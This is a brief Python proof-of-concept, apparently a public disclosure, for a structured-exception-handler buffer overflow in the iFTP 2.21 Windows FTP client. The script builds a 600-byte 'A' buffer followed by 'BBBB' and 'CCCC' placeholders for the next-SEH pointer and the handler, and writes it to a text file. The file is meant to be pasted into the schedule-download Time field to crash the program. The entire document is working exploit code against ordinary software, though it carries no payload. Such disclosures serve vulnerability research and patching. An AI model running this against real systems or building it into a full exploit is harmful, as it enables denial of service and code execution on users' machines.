# iFTP 2.21 SEH overwritten Crash PoC
# Author: Avinash Kumar Thapa "-Acid"
# Date of Testing :  28th April'2015
# Vendor's home page: http://www.memecode.com/iftp.php
# Software's Url: http://www.memecode.com/data/iftp-win32-v2.21.exe
# Crash Point: Go to Schedule > Schedule download > {+} >Time field


buffer = "A"*600

buffer += "BBBB" # Pointer to Next SEH Record

buffer += "CCCC" # SEH HANDLER


file = "test.txt"

f = open(file, "w")

f.write(buffer)

f.close()
